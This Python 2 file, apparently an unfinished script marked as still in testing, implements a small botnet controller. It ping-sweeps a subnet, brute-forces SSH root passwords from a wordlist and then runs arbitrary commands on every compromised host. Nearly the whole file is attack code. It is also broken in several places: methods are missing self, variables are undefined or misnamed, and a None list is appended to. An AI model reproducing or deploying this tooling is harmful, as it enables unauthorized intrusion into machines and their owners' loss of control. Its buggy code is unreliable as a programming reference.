#TODO: Testing. 
import os, socket, subprocess
from pexpect import pxssh
from threading import * 
import time 
from client import Client


class BotNet(object):

    def __init__(self):
        self.bots = None
        self.find_bots()

    def execute(self, command):
        if self.bots:
            for client in self.bots: 
                output = client.send_command(command)
                print "\nOutput from: {}".format(client.host_name)
                print "\n {}".format(output)

    def add_client(self, host_name, user_name, password):
        client = Client(host_name, user_name, password)
        self.bots.append(client)

    def find_bots(self):
        """This method finds the available and vulnerable machines on the subnet, and adds them to the botnet."""
        subnet_ip = raw_input('Enter the first 3 values of the subnet ip:')
        neighbor_ip = discover_neighbors(subnet_ip)
        print neighbor_ip
        neighbor_passwords = crack_passwords(neighbor_ip)
        print neighbor_passwords
        for host, password in neighbor_passwords: 
            self.add_client(host, 'root', password) 


    def discover_neighbors(self, subnet_ip):
        """This method takes as input the first three parts of the ip"""

        neighbor_ip = []

        with open(os.devnull, "wb") as f: 
            for i in xrange(0, 255): 
                ip = subnet_ip + ".{}".format(i)
                result=subprocess.Popen(["ping","-c","1","-n","-W","2",ip],stdout=limbo, stderr=limbo).wait()
                if not result: 
                    neighbor_ip.append(ip) 

        return neighbor_ip 
    
    def crack_passwords(self, neighbor_ip):
        """This method takes as input the neighboring ips and returns the user name and passworkd along with the ip address."""
        
        gathered_passwords = {}
        user = 'root' 
        password_file = 'password.txt'
        with open(password_file, 'rb') as pw_file: 
            password_list = pwfile.readlines()

        for single_ip in neighbor_ip:
            for i in password_list: 
                password = i.strip('\n')
                if connect(single_ip, user, password): 
                    gathered_passwords[single_ip] = password
                else: 
                    continue

        return gathered_passwords

    def connect(host, user, password): 
        """Helper function to crack_passwords"""
        
        cracked_password = False
        try: 
            s = pxssh.pxssh()
            s.login(host, user, password) 
            cracked_password = True
        except Exception, e: 
            if 'read_nonblocking' in str(e): 
                time.sleep(5)
                connect(host, user, password) 
            elif 'synchronize with original prompt' in str(e):
                time.sleep(1) 
                connect(host, user, password) 

        return cracked_password



def main(): 
    my_bots = BotNet() 
    print my_bots.bots


if __name__ == '__main__':
    main()








